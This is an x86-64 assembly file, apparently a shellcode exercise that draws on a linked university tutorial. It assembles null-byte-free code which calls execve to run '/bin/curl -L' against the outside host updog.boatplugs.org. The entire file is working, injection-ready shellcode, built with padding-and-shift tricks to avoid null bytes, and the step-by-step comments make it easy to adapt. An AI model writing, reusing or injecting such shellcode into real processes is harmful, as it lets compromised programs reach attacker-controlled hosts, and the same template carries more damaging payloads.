global _start

section .text
	; execve("/bin/curl", ["-L", "updog.boatplugs.org"], NULL)
	_start:
	mov eax,'Xorg'		;	move padded string into 4 byte register
	shr eax,8  			;	shift eax right 8 bits to drop off the padding, avoiding null bytes
	push rax 			;	push contents to stack
	mov rax,'atplugs.'  ;	move string into 8 byte register
	push rax 			;	push contents to stack
	mov rax,'updog.bo'  ;	move string into 8 byte register
	push rax  			;	push contents to stack

	xor rbx,rbx  		;	clear rbx register
	push rbx  			;	push null to stack
	mov eax,'XX-L'  	;	move padded string into 4 byte register
	shr eax,16  		;	shift eax right 16 bits to drop off the padding, avoiding null bytes
	push rax  			;	push contents to stack
	mov rcx,rsp			;	move stack pointer to rcx register for safe keeping

	push rbx  			;	push another null to the stack
	mov eax,'XXrl'  	;	move padded string into 4 byte register
	shr eax,16			;	shift eax right 16 bits to drop off the padding, avoiding null bytes
	push rax			;	push contents to stack
	mov rax,'/bin//cu'	;	move string into 8 byte register
	push rax			;	push contents to stack
	mov rdi,rsp			;	move stack pointer into rdi register for syscall filename param

	; build argv array right to left
	push rbx			;	push null to stack
	lea rax,[rcx+16]	;	move pointer to updog.boatplugs.org into rax
	push rax			;	push pointer to the stack
	lea rax,[rcx]		;	move pointer to -L into rax
	push rax			;	push pointer to the stack
	push rdi			;	push pointer to filename argv[0] to stack from rdi register
	mov rsi,rsp			;	move stack pointer into rsi register for syscall argv parameter

	xor rdx,rdx			;	null out the syscall arg3 param
	xor rax,rax			;	null out the syscall number param
	mov al, 0x3b		;	set syscall number to execve (59)
	syscall 			;	fastcall syscall instruction

;	https://www.cs.fsu.edu/~langley/CNT5605/2017-Summer/assembly-example/assembly.html